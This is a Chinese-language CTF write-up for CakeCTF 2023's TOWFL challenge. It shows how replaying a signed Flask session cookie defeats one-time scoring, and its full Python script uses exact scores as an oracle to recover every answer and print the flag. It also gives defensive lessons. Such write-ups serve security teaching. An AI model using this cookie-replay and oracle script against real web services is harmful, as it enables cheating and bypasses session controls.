# TOWFL

## 题目简述

题目是一个问答考试服务。`POST /api/start` 生成 10 组题目，每组包含 10 个四选一问题；`POST /api/submit` 保存各位置是否正确，`GET /api/score` 返回 100 个位置的总正确数，满分时附带 flag。

服务端用 Flask session 保存考试标识 `eid`，题目、答案和判定结果存放在 Redis。评分接口返回结果后会执行：

```python
flask.session.clear()
```

这看似让评分只能查询一次，实际只要求客户端删除 Flask 的 session Cookie。旧 Cookie 本身没有在服务端撤销，Redis 中的 `eid` 记录也没有删除。只要固定重放 `/api/start` 签发的原始 Cookie，就能持续提交同一套题，并把精确分数当成答案 oracle。

## 解题过程

Flask 默认 session 是签名的客户端 Cookie。签名可以防止攻击者篡改 `eid`，却不提供新鲜性或一次性语义。`session.clear()` 使响应带上一个过期 Cookie，但不会令已经签发的旧 Cookie 在密码学上失效。

官方脚本没有使用会自动接收响应 Cookie 更新的 `requests.Session()`，而是在 `/api/start` 后保存 `r.cookies`，并在每个后续请求中显式传回同一对象：

```python
r = requests.post(f"{URL}/api/start")
cookies = r.cookies

r = requests.post(f"{URL}/api/submit", json=answers, cookies=cookies)
r = requests.get(f"{URL}/api/score", cookies=cookies)
```

因此，即使 `/api/score` 响应要求删除 session，下一次请求仍携带最初的 Cookie，服务端继续解出相同 `eid`。

答案恢复从全零矩阵开始。设当前基线分数为 $s$，逐个位置尝试 1、2、3：

- 若新分数大于 $s$，当前候选正确，保留它并更新基线；
- 若新分数小于 $s$，说明原来的 0 正确，恢复为 0；
- 若分数不变，当前候选和原来的 0 都不正确，继续尝试下一个值。

完整复现如下：

```python
import os
import requests

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "8888")
URL = f"http://{HOST}:{PORT}"

r = requests.post(f"{URL}/api/start")
cookies = r.cookies  # 固定保存，不接受 score 响应要求的删除更新

answers = [[0] * 10 for _ in range(10)]

def get_score():
    requests.post(f"{URL}/api/submit", json=answers, cookies=cookies)
    r = requests.get(f"{URL}/api/score", cookies=cookies)
    return r.json()["data"]

base = get_score()["score"]

for i in range(10):
    for j in range(10):
        for candidate in range(1, 4):
            answers[i][j] = candidate
            data = get_score()
            score = data["score"]

            if score > base:
                base = score
                break
            if score < base:
                answers[i][j] = 0
                break

data = get_score()
print(data["score"], data["flag"])
```

当 100 个位置全部恢复后，分数为 100，返回：

```text
CakeCTF{b3_c4ut10us_1f_s3ss10n_1s_cl13nt_s1d3_0r_s3rv3r_s1d3}
```

参赛者的[HTTP 抓包记录](https://blog.whale-tw.com/2023/11/12/cakectf2023/)也显示：评分响应下发了删除 Cookie 的 `Set-Cookie`，后续请求却继续携带旧 Cookie 并访问同一套题。正文已完整解释该现象，外链只作为运行时旁证。

## 方法总结

- 核心技巧：固定重放 Flask 客户端 session Cookie，使服务端所谓的一次性评分失效，再用分数差分逐位恢复答案。
- 识别信号：敏感状态放在签名但可重放的客户端 Cookie 中；服务端只让客户端删除 Cookie，却没有服务端 nonce、撤销表或题目状态销毁。
- 复用要点：签名保证完整性，不保证新鲜性。真正的一次性流程必须在服务端消费并撤销标识；评分结果还应避免暴露可逐项比较的精确反馈。
